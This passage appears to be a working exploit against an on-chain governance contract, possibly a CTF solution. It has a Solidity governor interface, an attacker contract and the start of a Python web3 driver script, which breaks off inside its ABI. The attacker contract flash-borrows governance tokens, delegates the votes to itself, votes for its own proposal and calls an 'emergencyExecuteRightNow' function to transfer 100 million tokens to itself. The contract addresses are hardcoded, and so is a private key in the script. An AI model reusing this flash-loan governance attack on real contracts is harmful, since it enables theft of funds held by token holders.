        address[] memory targets,
        uint256[] memory values,
        bytes[] memory calldatas,
        bytes32 descriptionHash
    ) external pure virtual returns (uint256);
    /**
     * @notice module:core
     * @dev Current state of a proposal, following Compound's convention
     */
    function state(uint256 proposalId) external view virtual returns (ProposalState);
    /**
     * @notice module:core
     * @dev Block number used to retrieve user's votes and quorum. As per Compound's 
Comp and OpenZeppelin's
     * ERC20Votes, the snapshot is performed at the end of this block. Hence, voting 
for this proposal starts at the
     * beginning of the following block.
     */
    function proposalSnapshot(uint256 proposalId) external view virtual returns 
(uint256);
    /**
     * @notice module:core
     * @dev Block number at which votes close. Votes close at the end of this block, so 
it is possible to cast a vote
     * during this block.
     */
    function proposalDeadline(uint256 proposalId) external view virtual returns 
(uint256);
    /**
     * @notice module:user-config
     * @dev Delay, in number of block, between the proposal is created and the vote 
starts. This can be increassed to
     * leave time for users to buy voting power, of delegate it, before the voting of a 
proposal starts.
     */
    function votingDelay() external view virtual returns (uint256);
    /**
     * @notice module:user-config
     * @dev Delay, in number of blocks, between the vote start and vote ends.
     *
     * NOTE: The {votingDelay} can delay the start of the vote. This must be considered 
when setting the voting
     * duration compared to the voting delay.
     */
    function votingPeriod() external view virtual returns (uint256);
    /**
     * @notice module:user-config
     * @dev Minimum number of cast voted required for a proposal to be successful.
     *
     * Note: The `blockNumber` parameter corresponds to the snapshot used for counting 
vote. This allows to scale the
     * quorum depending on values such as the totalSupply of a token at this block (see 
{ERC20Votes}).
     */
    function quorum(uint256 blockNumber) external view virtual returns (uint256);
    /**
     * @notice module:reputation
     * @dev Voting power of an `account` at a specific `blockNumber`.
     *
     * Note: this can be implemented in a number of ways, for example by reading the 
delegated balance from one (or
     * multiple), {ERC20Votes} tokens.
     */
    function getVotes(address account, uint256 blockNumber) external view virtual 
returns (uint256);
    /**
     * @notice module:reputation
     * @dev Voting power of an `account` at a specific `blockNumber` given additional 
encoded parameters.
     */
    function getVotesWithParams(
        address account,
        uint256 blockNumber,
        bytes memory params
    ) external view virtual returns (uint256);
    /**
     * @notice module:voting
     * @dev Returns weither `account` has cast a vote on `proposalId`.
     */
    function hasVoted(uint256 proposalId, address account) external view virtual 
returns (bool);
    /**
     * @dev Create a new proposal. Vote start {IGovernor-votingDelay} blocks after the 
proposal is created and ends
     * {IGovernor-votingPeriod} blocks after the voting starts.
     *
     * Emits a {ProposalCreated} event.
     */
    function propose(
        address[] memory targets,
        uint256[] memory values,
        bytes[] memory calldatas,
        string memory description
    ) external virtual returns (uint256 proposalId);
    /**
     * @dev Execute a successful proposal. This requires the quorum to be reached, the 
vote to be successful, and the
     * deadline to be reached.
     *
     * Emits a {ProposalExecuted} event.
     *
     * Note: some module can modify the requirements for execution, for example by 
adding an additional timelock.
     */
    function emergencyExecuteRightNow(
        address[] memory targets,
        uint256[] memory values,
        bytes[] memory calldatas,
        bytes32 descriptionHash
    ) external payable virtual returns (uint256 proposalId);
    function execute(
        address[] memory targets,
        uint256[] memory values,
        bytes[] memory calldatas,
        bytes32 descriptionHash
    ) external payable virtual returns (uint256 proposalId);
    /**
     * @dev Cast a vote
     *
     * Emits a {VoteCast} event.
     */
    function castVote(uint256 proposalId, uint8 support) external virtual returns 
(uint256 balance);
    /**
     * @dev Cast a vote with a reason
     *
     * Emits a {VoteCast} event.
     */
    function castVoteWithReason(
        uint256 proposalId,
        uint8 support,
        string calldata reason
    ) external virtual returns (uint256 balance);
    /**
     * @dev Cast a vote with a reason and additional encoded parameters
     *
     * Emits a {VoteCast} event.
     */
    function castVoteWithReasonAndParams(
        uint256 proposalId,
        uint8 support,
        string calldata reason,
        bytes memory params
    ) external virtual returns (uint256 balance);
    /**
     * @dev Cast a vote using the user's cryptographic signature.
     *
     * Emits a {VoteCast} event.
     */
    function castVoteBySig(
        uint256 proposalId,
        uint8 support,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external virtual returns (uint256 balance);
    /**
     * @dev Cast a vote with a reason and additional encoded parameters using the 
user's cryptographic signature.
     *
     * Emits a {VoteCast} event.
     */
    function castVoteWithReasonAndParamsBySig(
        uint256 proposalId,
        uint8 support,
        string calldata reason,
        bytes memory params,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external virtual returns (uint256 balance);
}
interface AAA is IERC20{
    function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external;
    function delegate(address delegatee) external;
}
interface Gov is IGovernor{
}
contract test is IERC3156FlashBorrower{
    AAA addr_aaa = AAA(0xB3bd9369f0800f44AF65A7Cb6cDCd260d43a1Fc7);
    Gov addr_gov = Gov(0x90281424B4aC14Ff93260a5B24e7ca5DDc67E1AB);
    bytes32 constant _RETURN_VALUE = keccak256("ERC3156FlashBorrower.onFlashLoan");
    uint256 proposalId;
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32){
        // step3 delegate here and ckpts[address(this)] becomes 
[{current_blockNum,flashLoan_amount}]
        call_delegate();
        // castVote to vote for address(this)
        addr_gov.castVote(proposalId,1);
        // execute the propose
        address[] memory targets=new address[](1); targets[0] =  address(this);
        uint256[] memory values=new uint256[](1);values[0]= 100000000 * 10 ** 18;
        bytes[] memory calldatas=new bytes[](1);calldatas[0] = 
abi.encodeWithSignature("atransfer()"); // transfer to address(this)
        bytes32 description = keccak256(bytes(""));
        addr_gov.emergencyExecuteRightNow(targets,values,calldatas,description);
        return _RETURN_VALUE;
    }
    // step2 flashLoan and triger attack
    function call_flashLoan() public {
        addr_aaa.approve(address(addr_aaa),type(uint256).max);
 addr_aaa.flashLoan(IERC3156FlashBorrower(address(this)),address(addr_aaa),300000000 * 
10 ** 18,""); 
    }
    event call_propose_event(string);
    // step1 propose and wait for 10 blocks
    function call_propose() public {
        address[] memory targets=new address[](1); targets[0] = address(this);
        uint256[] memory values=new uint256[](1);values[0]= 100000000 * 10 ** 18;
        bytes[] memory calldatas=new bytes[](1);calldatas[0] = 
abi.encodeWithSignature("atransfer()"); // transfer to address(this)
        string memory description = "";
        addr_gov.propose(targets,values,calldatas,description);
        emit call_propose_event("call_propose success");
    }
    function set_proposalId(uint256 _prosId) public {
        proposalId = _prosId;
    }
    function call_delegate() public {
        addr_aaa.delegate(address(this));
    }
    function atransfer() public {
        (bool success,) = 
address(0xB3bd9369f0800f44AF65A7Cb6cDCd260d43a1Fc7).call(abi.encodeWithSignature("trans
fer(address,uint256)",msg.sender,100000000 * 10 ** 18));
        require(success,"attack call fail");
    }
}
from web3 import Web3, HTTPProvider
w3 = Web3(Web3.HTTPProvider(''))
priv_key = "802d86d9167f48b1c7f927f6247ccf56ed4c754b1be0b179867444f491a3a212" 
my_account = w3.eth.account.from_key(priv_key)
print(my_account.address)
abi = [
  {
    "anonymous": False,
    "inputs": [
      {
        "indexed": False,
        "internalType": "string",
        "name": "",
        "type": "string"
      }
    ],
    "name": "call_propose_event",
    "type": "event"
  },
  {
    "inputs": [],
    "name": "call_delegate",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "call_flashLoan",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "call_propose",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "initiator",
        "type": "address"
      },
      {
        "internalType": "address",
        "name": "token",
        "type": "address"
      },
      {
        "internalType": "uint256",
        "name": "amount",